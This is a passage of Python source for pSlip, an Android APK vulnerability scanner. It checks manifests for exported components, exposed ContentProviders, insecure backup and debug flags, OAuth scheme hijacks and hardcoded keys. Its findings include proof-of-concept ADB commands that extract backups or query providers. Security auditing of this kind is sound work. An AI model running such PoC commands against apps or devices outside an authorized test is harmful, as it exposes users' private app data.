#!/usr/bin/env python3
import sys
import json
import subprocess
import os
import textwrap
import re
import zipfile
import multiprocessing
from multiprocessing import Pool


def _bootstrap_dependencies():
    """Ensure pSlip's third-party Python packages are importable; install any
    that are missing via pip, bootstrapping pip with ensurepip when needed and
    falling back to a --user install. This lets pSlip run from a clean Windows
    Python with no manual `pip install` step. It is best-effort and transparent:
    it acts only when a package is actually missing, prints what it is doing, and
    prints clear manual instructions if it cannot install. Set
    PSLIP_NO_AUTOINSTALL=1 to disable. (External tools apktool/jadx are NOT
    installed here - they are optional; androguard handles manifest analysis and
    only the AES pass needs them.)
    """
    import importlib.util
    required = {'tqdm': 'tqdm', 'androguard': 'androguard'}  # import name -> pip name

    def _missing():
        out = []
        for mod, pip_name in required.items():
            try:
                present = importlib.util.find_spec(mod) is not None
            except Exception:
                present = False
            if not present:
                out.append(pip_name)
        return out

    missing = _missing()
    if not missing:
        return

    if (os.environ.get('PSLIP_NO_AUTOINSTALL') or '').strip().lower() in ('1', 'true', 'yes'):
        sys.stderr.write(
            "[pSlip] Missing dependencies: %s (auto-install disabled).\n"
            "[pSlip] Install with: %s -m pip install %s\n"
            % (' '.join(missing), sys.executable, ' '.join(missing)))
        sys.exit(1)

    # Only attempt the install once per invocation (guards against a loop if the
    # install reports success but the package still will not import).
    if os.environ.get('PSLIP_DEP_BOOTSTRAP') == '1':
        sys.stderr.write(
            "[pSlip] Still missing after install attempt: %s\n"
            "[pSlip] Install manually then re-run: %s -m pip install %s\n"
            % (' '.join(missing), sys.executable, ' '.join(missing)))
        sys.exit(1)

    print("[pSlip] Missing Python dependencies: %s. Attempting to install..."
          % ', '.join(missing))

    # Clean Microsoft Store / embedded Pythons can ship without pip.
    try:
        if importlib.util.find_spec('pip') is None:
            print("[pSlip] pip not found; bootstrapping with ensurepip...")
            subprocess.run([sys.executable, '-m', 'ensurepip', '--upgrade'], check=False)
    except Exception:
        pass

    pip_base = [sys.executable, '-m', 'pip', 'install', '--disable-pip-version-check']
    try:
        rc = subprocess.run(pip_base + missing).returncode
    except Exception:
        rc = 1
    if rc != 0:
        # Permission-restricted environments (e.g. Store Python) often need --user.
        print("[pSlip] Retrying with a per-user install (--user)...")
        try:
            subprocess.run(pip_base + ['--user'] + missing, check=False)
        except Exception:
            pass

    # Re-run in a fresh process so a newly created site/user-site is on sys.path
    # (importing immediately after a runtime install in the same process is
    # unreliable). The child inherits PSLIP_DEP_BOOTSTRAP=1 so it will not loop.
    os.environ['PSLIP_DEP_BOOTSTRAP'] = '1'
    try:
        sys.exit(subprocess.run([sys.executable] + sys.argv).returncode)
    except Exception:
        importlib.invalidate_caches()
        if _missing():
            print("[pSlip] Dependencies installed. Please re-run pSlip.")
            sys.exit(0)


_bootstrap_dependencies()

from tqdm import tqdm
from datetime import datetime
import xml.etree.ElementTree as ET
import platform
import shutil
import tempfile
import signal


def _env_int(name, default):
    """Read a positive int from the environment, else return default. Read at
    import time so it is consistent across fork AND spawn worker processes
    (spawn re-imports this module and inherits the parent's environment)."""
    try:
        v = int((os.environ.get(name) or '').strip())
        return v if v > 0 else default
    except Exception:
        return default


# Hard caps for external decoders so one malformed/adversarial APK cannot hang
# the whole scan (apktool/jadx can spin indefinitely on crafted input). On
# expiry the entire child process tree is killed (see _run_tool/_kill_tree) and
# the call sites treat it as a decode failure for that APK. Override via env:
#   PSLIP_APKTOOL_TIMEOUT / PSLIP_JADX_TIMEOUT (seconds).
APKTOOL_TIMEOUT_SECONDS = _env_int('PSLIP_APKTOOL_TIMEOUT', 240)
JADX_TIMEOUT_SECONDS = _env_int('PSLIP_JADX_TIMEOUT', 300)

# ============================================================
# Platform detection + cross-platform shims (Linux / Windows)
# ============================================================
IS_WINDOWS = (os.name == 'nt')
IS_MACOS = (sys.platform == 'darwin')
PLATFORM_NAME = platform.system() or os.name

# Console may use a legacy code page (e.g. cp1252 on Windows) that cannot encode
# the banner's box-drawing glyphs or non-ASCII strings extracted from APKs.
# Force UTF-8 with replacement so a stray character never crashes a print.
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass


def _enable_windows_vt():
    """Enable ANSI/VT escape processing in modern Windows consoles
    (Windows 10 1511+). Returns True on success."""
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        for handle_id in (-11, -12):  # STDOUT, STDERR
            h = kernel32.GetStdHandle(handle_id)
            if not h or h == ctypes.c_void_p(-1).value:
                continue
            mode = ctypes.c_uint32()
            if not kernel32.GetConsoleMode(h, ctypes.byref(mode)):
                continue
            # ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
            kernel32.SetConsoleMode(h, mode.value | 0x0004)
        return True
    except Exception:
        return False


def _supports_color():
    """Decide whether ANSI color is safe to emit on this platform/stream."""
    if os.environ.get('NO_COLOR'):
        return False
    if os.environ.get('PSLIP_FORCE_COLOR'):
        return True
    try:
        if not sys.stdout.isatty():
            return False  # piped/redirected -> emit clean text, no escape codes
    except Exception:
        return False
    if IS_WINDOWS:
        return _enable_windows_vt()
    return True


if _supports_color():
    RESET = "\033[0m"
    YELLOW = "\033[93m"
    GREEN = "\033[92m"
    CYAN = "\033[96m"
    RED = "\033[91m"
    BOLD = "\033[1m"
else:
    RESET = YELLOW = GREEN = CYAN = RED = BOLD = ""


# Optional explicit overrides so pSlip can use a jadx/apktool that is not on
# PATH. Set via env var (PSLIP_JADX / PSLIP_APKTOOL) or the -jadx / -apktool
# flags. The value may be the CLI launcher itself, a directory to search, or
# even the GUI build (we then look for the real CLI next to it).
_TOOL_ENV = {'jadx': 'PSLIP_JADX', 'jadx-cli': 'PSLIP_JADX',
             'apktool': 'PSLIP_APKTOOL', 'aapt': 'PSLIP_AAPT', 'aapt2': 'PSLIP_AAPT2'}


def _cli_launcher_candidates(name):
    base = 'jadx' if name in ('jadx', 'jadx-cli') else name
    return [base + '.bat', base + '.cmd', base + '.exe', base]


def _find_cli_in_dir(directory, name):
    """Search a directory for a tool's command-line launcher, skipping GUI
    launchers (e.g. jadx-gui). Looks in the directory, its bin/, and one level
    of child dirs (so pointing at an extracted jadx-x.y.z/ folder works too).
    Returns a full path or None."""
    if not directory or not os.path.isdir(directory):
        return None
    cands = _cli_launcher_candidates(name)
    search = [directory, os.path.join(directory, 'bin')]
    try:
        for child in sorted(os.listdir(directory)):
            cp = os.path.join(directory, child)
            if os.path.isdir(cp):
                search.append(cp)
                search.append(os.path.join(cp, 'bin'))
    except Exception:
        pass
    for base in search:
        for fn in cands:
            cand = os.path.join(base, fn)
            if os.path.isfile(cand) and 'gui' not in os.path.basename(cand).lower():
                return cand
    return None


def _resolve_tool(name):
    """Resolve an external tool to a full path. A PSLIP_<TOOL> override (env var
    or -jadx/-apktool flag) is honored first: it may be the CLI launcher, a
    directory to search, or the GUI build (we then look for the CLI next to it).
    If no override resolves, fall back to PATH. On Windows, PATHEXT lets
    shutil.which find apktool.bat / jadx.cmd / aapt.exe. Returns None if not
    found."""
    env = _TOOL_ENV.get(name)
    override = (os.environ.get(env) or '').strip().strip('"').strip("'") if env else ''
    if override:
        if os.path.isdir(override):
            hit = _find_cli_in_dir(override, name)
            if hit:
                return hit
        elif os.path.isfile(override):
            if 'gui' in os.path.basename(override).lower():
                hit = _find_cli_in_dir(os.path.dirname(override), name)
                if hit:
                    return hit
            else:
                return override
        # Override set but no usable CLI found - fall through to PATH.
    return shutil.which(name)


def _kill_tree(proc):
    """Hard-kill a process and all of its descendants.

    subprocess's own timeout only kills the direct child (the apktool/jadx
    launcher script); its JVM grandchild would be orphaned and keep running.
    On POSIX we start the child in its own session and kill the whole process
    group; on Windows we taskkill the tree.
    """
    try:
        if IS_WINDOWS:
            subprocess.run(['taskkill', '/F', '/T', '/PID', str(proc.pid)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                proc.kill()
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass


def _run_tool(args, timeout=None, **kwargs):
    """Cross-platform external-tool runner.

    args[0] is a tool NAME (e.g. 'apktool'); it is resolved via PATH so the
    correct platform wrapper is used. On Windows, .bat/.cmd wrappers cannot be
    launched by CreateProcess directly, so they are run through 'cmd /c'.

    If `timeout` is given, the child runs in its own process group/session so
    that on expiry the ENTIRE tree (including the JVM grandchild) is killed,
    then TimeoutExpired is re-raised for the caller to handle. Without a
    timeout, behaves like a plain subprocess.run.

    Returns a CompletedProcess, or None if the tool could not be found.
    """
    exe = _resolve_tool(args[0])
    if not exe:
        return None
    real = [exe] + [str(a) for a in args[1:]]
    if IS_WINDOWS and exe.lower().endswith(('.bat', '.cmd')):
        real = ['cmd', '/c'] + real

    if timeout is None:
        return subprocess.run(real, **kwargs)

    # Timeout path: own process group/session so we can kill the whole tree.
    if IS_WINDOWS:
        kwargs['creationflags'] = kwargs.get('creationflags', 0) | getattr(
            subprocess, 'CREATE_NEW_PROCESS_GROUP', 0)
    else:
        kwargs['start_new_session'] = True

    proc = subprocess.Popen(real, **kwargs)
    try:
        stdout, stderr = proc.communicate(timeout=timeout)
        return subprocess.CompletedProcess(real, proc.returncode, stdout, stderr)
    except subprocess.TimeoutExpired:
        _kill_tree(proc)
        try:
            proc.communicate(timeout=10)   # reap; drain pipes so nothing blocks
        except Exception:
            pass
        raise


def _proc_fail_reason(proc, name):
    """Build a concise failure reason from a finished subprocess.

    Many Windows tool launchers (jadx.bat in particular) print their fatal
    error (e.g. "no 'java' command could be found") to STDOUT via batch echo,
    not STDERR. Surfacing stderr alone then leaves only a bare "exit N". This
    combines both streams, collapses whitespace, and truncates so the real
    cause (missing Java, bad APK, OOM) is visible in the warning line.
    """
    def _dec(b):
        if not b:
            return ""
        try:
            return b.decode(errors='ignore')
        except Exception:
            return ""
    err = _dec(getattr(proc, 'stderr', b'')).strip()
    out = _dec(getattr(proc, 'stdout', b'')).strip()
    msg = err or out
    if err and out and out not in err:
        msg = err + " | " + out
    msg = " ".join(msg.split())
    if not msg:
        return f"{name} exit {proc.returncode}"
    if len(msg) > 300:
        msg = msg[:220] + " ... " + msg[-60:]
    return f"{name} exit {proc.returncode}: {msg}"


def _rmtree(path):
    """Cross-platform recursive delete (replacement for `rm -rf`).
    On Windows, read-only files (common in extracted APK trees) can block
    deletion, so retry after clearing the read-only bit."""
    if not path or not os.path.exists(path):
        return
    try:
        shutil.rmtree(path, ignore_errors=True)
    except Exception:
        pass
    if os.path.exists(path):
        def _on_error(func, p, exc_info):
            try:
                import stat
                os.chmod(p, stat.S_IWRITE)
                func(p)
            except Exception:
                pass
        try:
            shutil.rmtree(path, onerror=_on_error)
        except Exception:
            pass


def _sweep_stale_temp(max_age_minutes=30):
    """Reclaim leaked container-extraction dirs from prior crashed runs.

    gather_apk_inputs extracts .xapk/.apks/.apkm into a tempfile.mkdtemp under
    the system temp dir. If a run crashes before its end-of-run cleanup, that
    dir (often gigabytes of extracted APKs) leaks. Across many crashed runs the
    temp drive fills, after which new extractions silently fail and containers
    drop out of the scan. This best-effort sweep removes pslip_xapk_* dirs that
    have not been touched in max_age_minutes, so an actively running concurrent
    extraction is left alone while stale leaks are cleared."""
    try:
        import tempfile as _tf
        import glob as _glob
        import time as _time
        base = _tf.gettempdir()
        cutoff = _time.time() - max_age_minutes * 60
        for d in _glob.glob(os.path.join(base, "pslip_xapk_*")):
            try:
                if os.path.isdir(d) and os.path.getmtime(d) < cutoff:
                    _rmtree(d)
            except Exception:
                pass
    except Exception:
        pass


def _tool_status():
    """Detect optional external tools on this platform. androguard (Python) is
    the primary engine for manifest + OAuth analysis; apktool/jadx are only
    needed for the AES/DES source-decompile pass."""
    status = {}
    for name in ('apktool', 'jadx', 'jadx-cli', 'aapt', 'aapt2'):
        status[name] = _resolve_tool(name)
    try:
        import androguard  # noqa: F401
        status['androguard'] = getattr(androguard, '__version__', 'installed')
    except Exception:
        status['androguard'] = None
    return status


def _print_environment():
    """Report detected platform and tool availability so behaviour is
    transparent on whichever OS pSlip is launched from."""
    import multiprocessing as _mp
    st = _tool_status()
    try:
        cpus = _mp.cpu_count()
    except Exception:
        cpus = 1
    py = sys.version.split()[0]
    print(f"{BOLD}Environment:{RESET} {PLATFORM_NAME} | Python {py} | {cpus} CPU(s) | "
          f"start method: {_mp.get_start_method(allow_none=True) or 'default'}")

    def mark(v):
        return (f"{GREEN}found{RESET}" if v else f"{YELLOW}missing{RESET}")

    androguard_ok = bool(st.get('androguard'))
    jadx_ok = bool(st.get('jadx') or st.get('jadx-cli'))
    print(f"  androguard (primary manifest + OAuth engine): {mark(androguard_ok)}"
          + (f" v{st['androguard']}" if isinstance(st.get('androguard'), str) else ""))
    print(f"  apktool (manifest fallback + AES deep pass):  {mark(st.get('apktool'))}")
    print(f"  jadx (optional AES deep pass: -aes-deep):     {mark(jadx_ok)}")
    print(f"  aapt/aapt2 (package-name fallback):           {mark(st.get('aapt') or st.get('aapt2'))}")

    if not androguard_ok and not st.get('apktool'):
        print(f"{RED}Warning: neither androguard nor apktool is available - manifest analysis "
              f"will not work. Install androguard (pip) for the primary engine.{RESET}")
    elif androguard_ok:
        print(f"{GREEN}Manifest analysis will use androguard (no apktool/Java required).{RESET}")
    _deep = os.environ.get('PSLIP_AES_DEEP') == '1'
    if androguard_ok and not _deep:
        print(f"{GREEN}AES/DES/IV detection: androguard DEX bytecode scan "
              f"(no Java; add -aes-deep for the jadx source pass).{RESET}")
    if _deep and not jadx_ok and not st.get('apktool'):
        print(f"{YELLOW}Note: -aes-deep needs jadx or apktool; neither found, the deep AES pass will be skipped.{RESET}")

    # Explicit-override diagnostics (PSLIP_JADX / PSLIP_APKTOOL or -jadx/-apktool).
    for tool, envk in (('jadx', 'PSLIP_JADX'), ('apktool', 'PSLIP_APKTOOL')):
        ov = (os.environ.get(envk) or '').strip().strip('"').strip("'")
        if not ov:
            continue
        resolved = _resolve_tool(tool)
        if resolved:
            print(f"{GREEN}Using {tool} from {envk}: {resolved}{RESET}")
        elif 'gui' in os.path.basename(ov).lower():
            print(f"{RED}{envk} points at the jadx GUI build ({os.path.basename(ov)}), which cannot "
                  f"decompile from the command line. Download the CLI bundle 'jadx-<ver>.zip' "
                  f"(it contains bin/jadx.bat) and point {envk} at that instead.{RESET}")
        else:
            print(f"{YELLOW}{envk} is set ({ov}) but no usable {tool} CLI was found there.{RESET}")
    print()


BANNER = f"""
{YELLOW}
██████╗ ███████╗██╗     ██╗██████╗ 
██╔══██╗██╔════╝██║     ██║██╔══██╗
██████╔╝███████╗██║     ██║██████╔╝
██╔═══╝ ╚════██║██║     ██║██╔═══╝ 
██║     ███████║███████╗██║██║     
╚═╝     ╚══════╝╚═╝╚═╝                                                  
{RESET}{BOLD}
Version 1.3.5 | https://actuator.sh/
{RESET}
"""

def print_help():
    print(BANNER)
    print(textwrap.dedent(f"""\
        {BOLD}What it does:{RESET}
        Static analyzer for Android APKs and split bundles (.xapk/.apks/.apkm).
        Flags, each with a PoC:
          - exported components / ContentProviders; unsafe CALL, VIEW+javascript:, wildcard deep links
          - manifest hardening (cleartext, allowBackup, debuggable)
          - OAuth redirect scheme-hijack, incl. client_secret shipped in the APK
          - hardcoded AES/DES keys and IVs (DEX bytecode)
        androguard-based, no Java; jadx/apktool only for -aes-deep.

        {BOLD}Usage:{RESET} python pSlip.py <apk/xapk/apks/apkm or directory> [-all] [-allsafe] [-html <output_file>] [-json <output_file>] [-oauth-poc]

        {BOLD}Inputs:{RESET}
        Accepts a single .apk, a split-APK container (.xapk / .apks / .apkm), or a
        directory (scanned recursively for all of the above). Containers are expanded
        automatically: the base APK and any code-bearing feature splits are analyzed;
        config / ABI / resource-only splits are skipped.

        {BOLD}Scan Modes:{RESET}
        -all              Run full analysis, including the AES/DES/IV key pass
        -allsafe          Run full analysis but skip the AES/DES/IV key pass (faster)
        -aes-deep         Run the key pass via jadx/apktool source decompilation
                          instead of the default androguard DEX bytecode scan.
                          Slower and needs jadx or apktool, but can resolve keys
                          assembled across branches or loaded from static fields.
        -aes-timeout <m>  Per-APK time limit for the key pass, in minutes (default 5)

        {BOLD}OAuth scheme-hijack:{RESET}
        (detection is always-on; no flag needed to find OAuth scheme-hijack issues)
        -oauth-poc            Also generate buildable Android PoC projects for OAuth findings
        -oauth-poc-dir <dir>  Output directory for OAuth PoC projects (default: pslip_oauth_pocs)

        {BOLD}Output Options:{RESET}
        -html <file>      Save the vulnerability report as an HTML file
        -json <file>      Save the vulnerability report as a JSON file

        {BOLD}External tools (optional; for the AES/DES pass only):{RESET}
        androguard (pip) handles manifest + OAuth analysis with no Java. The AES/DES
        source-decompile pass needs the jadx or apktool COMMAND-LINE tool. If they are
        not on PATH, point pSlip at them:
        -jadx <path>      Path to the jadx CLI (jadx.bat / jadx), a directory to search,
                          or the jadx GUI build (the CLI next to it is used). NOTE: the
                          'jadx-gui-*-with-jre-win' bundle is GUI-only and has no CLI -
                          use the cross-platform 'jadx-<ver>.zip' bundle (bin/jadx.bat).
        -apktool <path>   Path to the apktool CLI (apktool.bat / apktool) or its directory
        (equivalent env vars: PSLIP_JADX / PSLIP_APKTOOL)

        {BOLD}Environment:{RESET}
        PSLIP_APKTOOL_TIMEOUT / PSLIP_JADX_TIMEOUT   per-APK decoder caps in seconds
        (defaults 240 / 300). On expiry the whole decoder process tree is killed and
        that APK is skipped, so one hung/crafted APK cannot stall a large batch.
        PSLIP_NO_AUTOINSTALL=1   disable auto-install of missing Python dependencies.

      
    """))


def command_exists(command):
    return shutil.which(command) is not None

ANDROID_NS = 'http://schemas.android.com/apk/res/android'


def _has_inline_call_gate(elem):
    perm = (elem.get(f'{{{ANDROID_NS}}}permission') or '').strip()
    return perm in (
        'android.permission.CALL_PHONE',
        'android.permission.CALL_PRIVILEGED',
        'android.permission.CALL_EMERGENCY',
    )

def check_manifest_hardening(root, package_name, target_sdk_version):
    """
    perform cheap manifest-level hardening checks.

    This runs by default (no CLI flag) because it is effectively free compared
    to bytecode/AES scanning and only walks the already-parsed manifest tree.
    """
    vulnerabilities = []
    if root is None or not package_name:
        return vulnerabilities

    application = root.find('application')
    if application is None:
        return vulnerabilities

    # --- android:allowBackup ---
    allow_backup = application.get(f'{{{ANDROID_NS}}}allowBackup')
    if allow_backup is None or allow_backup.strip().lower() != 'false':
        details = (
            'android:allowBackup is not explicitly set to "false" on the '
            '<application> tag. This can allow device/ADB backups to include '
            'app data. For production builds, explicitly set '
            'android:allowBackup="false" unless backups are strictly '
            'required and carefully reviewed.'
        )
        vulnerabilities.append({
            'package_name': package_name,
            'Component': f'{package_name}/Application',
            'Issue Type': 'Hardening: Insecure Backup (android:allowBackup)',
            'Details': details,
            'Severity': 'Medium',
            'Confidence': 80,
            'ADB Command': f'adb backup -f {package_name}.ab {package_name}',
        })

    # --- android:debuggable ---
    debuggable = application.get(f'{{{ANDROID_NS}}}debuggable')
    if debuggable is not None and debuggable.strip().lower() == 'true':
        details = (
            'android:debuggable="true" is set on the <application> tag. '
            'Release builds should not be debuggable, as this allows runtime '
            'inspection and debugging of the app on production devices.'
        )
        vulnerabilities.append({
            'package_name': package_name,
            'Component': f'{package_name}/Application',
            'Issue Type': 'Hardening: Debuggable Application',
            'Details': details,
            'Severity': 'High',
            'Confidence': 90,
            'ADB Command': 'N/A',
        })

    # --- android:usesCleartextTraffic ---
    uses_cleartext = application.get(f'{{{ANDROID_NS}}}usesCleartextTraffic')
    if uses_cleartext is not None and uses_cleartext.strip().lower() == 'true':
        details = (
            'android:usesCleartextTraffic="true" allows cleartext (HTTP) '
            'traffic. Prefer HTTPS for all network calls and consider using '
            'a Network Security Config to explicitly limit any required '
            'cleartext endpoints.'
        )
        vulnerabilities.append({
            'package_name': package_name,
            'Component': f'{package_name}/Application',
            'Issue Type': 'Hardening: Cleartext Traffic Allowed',
            'Details': details,
            'Severity': 'Medium',
            'Confidence': 80,
            'ADB Command': 'N/A',
        })

    # --- Exported ContentProvider without permissions ---
    providers = application.findall('provider')
    for provider in providers:
        name = provider.get(f'{{{ANDROID_NS}}}name') or ''
        if not name:
            continue
        exported = is_exported(provider, target_sdk_version)
        if not exported:
            continue

        perm = (provider.get(f'{{{ANDROID_NS}}}permission') or '').strip()
        read_perm = (provider.get(f'{{{ANDROID_NS}}}readPermission') or '').strip()
        write_perm = (provider.get(f'{{{ANDROID_NS}}}writePermission') or '').strip()

        if not perm and not read_perm and not write_perm:
            comp_name = f'{package_name}/{name}'
            authority = (provider.get('authorities') or '').strip()
            details = (
                'Exported ContentProvider without any read/write permission. '
                'Other applications may be able to query or modify its data.'
            )
            if authority:
                details += f' Authority: "{authority}".'
            vulnerabilities.append({
                'package_name': package_name,
                'Component': comp_name,
                'Issue Type': 'Hardening: Exposed ContentProvider',
                'Details': details,
                'Severity': 'High',
                'Confidence': 80,
                'ADB Command': (
                    f'adb shell content query --uri content://{authority}'
                    if authority else 'N/A'
                ),
            })

    return vulnerabilities


def _extract_manifest_androguard(apk_file, base_dir):
    """Write a text AndroidManifest.xml using androguard (pure-Python, no
    apktool/Java needed). The android namespace round-trips through
    serialization, so pSlip's ElementTree parsers read attributes via
    {ANDROID_NS}attr exactly as with apktool output (verified on real APKs).
    Returns the manifest path, or None if androguard is unavailable/failed.
    """
    try:
        from androguard.core.apk import APK
        from lxml import etree as _L
    except Exception:
        return None
    try:
        root = APK(apk_file).get_android_manifest_xml()
        if root is None:
            return None
        data = _L.tostring(root, encoding='utf-8')
        if not data:
            return None
        os.makedirs(base_dir, exist_ok=True)
        manifest_file = os.path.join(base_dir, 'AndroidManifest.xml')
        with open(manifest_file, 'wb') as fh:
            fh.write(data)
        return manifest_file
    except Exception:
        return None


def extract_manifest(apk_file, base_dir):
    if os.path.exists(base_dir):
        _rmtree(base_dir)
        if os.path.exists(base_dir):
            print(f"{RED}Error: Failed to remove existing directory '{base_dir}'.{RESET}")
            return None

    # Primary engine: androguard (pure-Python; no apktool/Java required). It
    # reads only the manifest from the APK, so it is also far faster than a full
    # apktool decode. apktool remains the fallback below.
    mf = _extract_manifest_androguard(apk_file, base_dir)
    if mf is not None:
        return mf

    # Fallback: apktool (decodes the whole APK to disk).
    if os.path.exists(base_dir):
        _rmtree(base_dir)
    try:
        proc = _run_tool(['apktool', 'd', '-f', '-o', base_dir, apk_file],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         timeout=APKTOOL_TIMEOUT_SECONDS)
        if proc is None:
            print(f"{RED}Error: could not extract the manifest for '{apk_file}': androguard "
                  f"could not parse it and apktool is not on PATH. Install androguard (pip) "
                  f"or apktool.{RESET}")
            return None
        if proc.returncode != 0:
            err = (proc.stderr or b'').decode(errors='ignore')
            print(f"{RED}Error: Failed to extract APK file '{apk_file}': {err}{RESET}")
            return None
    except Exception as e:
        print(f"{RED}Error: Failed to extract APK file '{apk_file}': {e}{RESET}")
        return None
    manifest_file = os.path.join(base_dir, 'AndroidManifest.xml')
    if not os.path.exists(manifest_file):
        print(f"{RED}Error: Failed to find the extracted manifest file for '{apk_file}'.{RESET}")
        return None
    return manifest_file

def get_target_sdk_version(manifest_root):
    try:
        uses_sdk = manifest_root.find('uses-sdk')
        if uses_sdk is not None:
            target_sdk = uses_sdk.get('{http://schemas.android.com/apk/res/android}targetSdkVersion')
            if target_sdk is not None:
                return int(target_sdk)
    except Exception:
        pass
    except Exception as e:
        print(f"{RED}Error: Unable to extract targetSdkVersion: {e}{RESET}")
    return None

def get_package_name(manifest_root):
    try:
        package_name = manifest_root.attrib.get('package')
        return package_name
    except Exception:
        pass
    except Exception as e:
        print(f"{RED}Error: An unexpected error occurred while extracting package name: {e}{RESET}")
        return None

def is_exported(component, target_sdk_version):
 
    android_ns = 'http://schemas.android.com/apk/res/android'
    exported = component.get(f'{{{android_ns}}}exported')
    if exported is not None:
        return exported.lower() == 'true'
    else:
   
        if target_sdk_version is not None and target_sdk_version < 31:
            has_intent_filter = component.find('intent-filter') is not None
            return has_intent_filter
        else:
            return False

def format_component_name(package_name, component_name):
    """
    returns a string like:
      - 'com.example.app/.MainActivity' if component_name = '.MainActivity'
      - 'com.example.app/SomeActivity'  if it's not dotted
    """
    if component_name.startswith('.'):
        return f"{package_name}{component_name}"
    return f"{package_name}/{component_name}"

def collect_real_activities_export_status(application, package_name, target_sdk_version):
    """
    build a map of real <activity> fully-qualified names -> bool exported.
    this helps us verify if the underlying activity of an <activity-alias> is also exported.
    """
    android_ns = 'http://schemas.android.com/apk/res/android'
    activity_map = {}
    for act in application.findall('activity'):
        act_name = act.get(f'{{{android_ns}}}name')
        if not act_name:
            continue
        fq_name = format_component_name(package_name, act_name)
        activity_map[fq_name] = is_exported(act, target_sdk_version)
    return activity_map

def find_dangerous_components(manifest_file, target_sdk_version, check_js, check_call):
    dangerous_components = {}
    android_ns = "http://schemas.android.com/apk/res/android"
    ET.register_namespace('android', android_ns)

    try:
        tree = ET.parse(manifest_file)
        root = tree.getroot()
    except Exception:
        return dangerous_components

    package_name = get_package_name(root)
    application = root.find('application')
    if application is None:
        return dangerous_components

    real_activities_map = collect_real_activities_export_status(
        application, package_name, target_sdk_version
    )

    component_types = ["activity", "activity-alias", "service", "receiver"]

    for component_type in component_types:
        for component in application.findall(component_type):

            comp_name = component.get(f"{{{android_ns}}}name")
            if not comp_name:
                continue

            fq_name = format_component_name(package_name, comp_name)

            # Determine if exported
            if component_type == "activity-alias":
                alias_exported = is_exported(component, target_sdk_version)
                target_name = component.get(f"{{{android_ns}}}targetActivity")
                if not target_name:
                    continue

                fq_target = format_component_name(package_name, target_name)
                underlying_exported = real_activities_map.get(fq_target, False)

                exported = alias_exported and underlying_exported
            else:
                exported = is_exported(component, target_sdk_version)

            if not exported:
                continue

            intent_filters = component.findall("intent-filter")

            # Exported but no intent-filters → ONLY dangerous pre-API21
            if not intent_filters:
                if target_sdk_version is not None and target_sdk_version < 21:
                    dangerous_components[fq_name] = {
                        "component_type": component_type,
                        "intent_filters": [],
                        "is_call_vulnerable": False,
                        "is_js_vulnerable": False,
                        "is_http_open_vulnerable": False,
                        "no_intent_filter": True,
                        "custom_exported": True,
                    }
                continue

            # Exported with intent-filters
            if fq_name not in dangerous_components:
                dangerous_components[fq_name] = {
                    "component_type": component_type,
                    "intent_filters": [],
                    "is_call_vulnerable": False,
                    "is_js_vulnerable": False,
                    "is_http_open_vulnerable": False,
                    "no_intent_filter": False,
                    "custom_exported": True,
                }

            # Check dangerous filters
            for intent_filter in intent_filters:

                actions = intent_filter.findall("action")
                data_tags = intent_filter.findall("data")

                is_call_vuln = False
                is_js_vuln = False
                is_http_vuln = False

                # CALL
                if check_call:
                    for action in actions:
                        action_name = action.get(f"{{{android_ns}}}name")
                        if action_name in (
                            "android.intent.action.CALL",
                            "android.intent.action.CALL_PRIVILEGED",
                        ):
                            comp_perm = (component.get(
                                f"{{{android_ns}}}permission") or "").strip()
                            if comp_perm not in (
                                "android.permission.CALL_PHONE",
                                "android.permission.CALL_PRIVILEGED",
                                "android.permission.CALL_EMERGENCY",
                            ):
                                is_call_vuln = True
                                break

                # JS
                if check_js:
                    for data in data_tags:
                        scheme = (data.get(f"{{{android_ns}}}scheme") or "").lower()
                        mime = (data.get(f"{{{android_ns}}}mimeType") or "").lower()
                        if scheme == "javascript" or mime == "text/javascript":
                            is_js_vuln = True
                            break

                # HTTP Redirect
                for data in data_tags:
                    scheme = (data.get(f"{{{android_ns}}}scheme") or "").lower()
                    host = (data.get(f"{{{android_ns}}}host") or "").strip()

                    if scheme in ("http", "https") and host in ("", "*"):
                        is_http_vuln = True
                        break

                dangerous_components[fq_name]["intent_filters"].append(
                    ET.tostring(intent_filter, encoding="unicode")
                )

                dangerous_components[fq_name]["is_call_vulnerable"] |= is_call_vuln
                dangerous_components[fq_name]["is_js_vulnerable"] |= is_js_vuln
                dangerous_components[fq_name]["is_http_open_vulnerable"] |= is_http_vuln

    return dangerous_components





def find_permissions(manifest_file, apk_name, collect_vulnerabilities, package_name):
    permissions = []
    new_vulnerabilities = []
    normal_protection_permissions = []

    try:
        tree = ET.parse(manifest_file)
        root = tree.getroot()
        android_ns = 'http://schemas.android.com/apk/res/android'

        def ns(tag):
            return f'{{{android_ns}}}{tag}'

        # check all declared "uses-permission" entries
        for perm in root.findall('uses-permission'):
            name = perm.get(ns('name'))
            if name:
                permissions.append(name)

        # check all declared "permission" entries
        for perm in root.findall('permission'):
            name = perm.get(ns('name'))
            protectionLevel = perm.get(ns('protectionLevel'))

            # record name
            if name:
                permissions.append(name)

            # if protectionLevel is normal or not set add to normal_protection_permissions
            if protectionLevel is None or protectionLevel == 'normal':
                normal_protection_permissions.append(name)

    except Exception:
        pass
    except Exception as e:
        print(f"{RED}Error: An unexpected error occurred while reading permissions: {e}{RESET}")
        return permissions, [], []

    return permissions, new_vulnerabilities, normal_protection_permissions

def find_components_requiring_permissions(manifest_file, target_sdk_version, permissions_list, package_name):
    """
    look for exported components that require a permission (with normal or no protection level).
    """
    components_requiring_permissions = []
    try:
        tree = ET.parse(manifest_file)
        root = tree.getroot()
        android_ns = 'http://schemas.android.com/apk/res/android'
        application = root.find('application')
        if application is None:
            return components_requiring_permissions

        component_types = ['activity', 'activity-alias', 'service', 'receiver', 'provider']
        for component_type in component_types:
            comps = application.findall(component_type)
            for component in comps:
                component_name = component.get(f'{{{android_ns}}}name')
                if component_name is None:
                    continue
                exported = is_exported(component, target_sdk_version)
                if not exported:
                    continue
                permission = component.get(f'{{{android_ns}}}permission')
                if permission in permissions_list:
                    formatted_name = format_component_name(package_name, component_name)
                    components_requiring_permissions.append({
                        'component_type': component_type,
                        'component_name': formatted_name,
                        'required_permission': permission
                    })
    except Exception:
        pass
    except Exception as e:
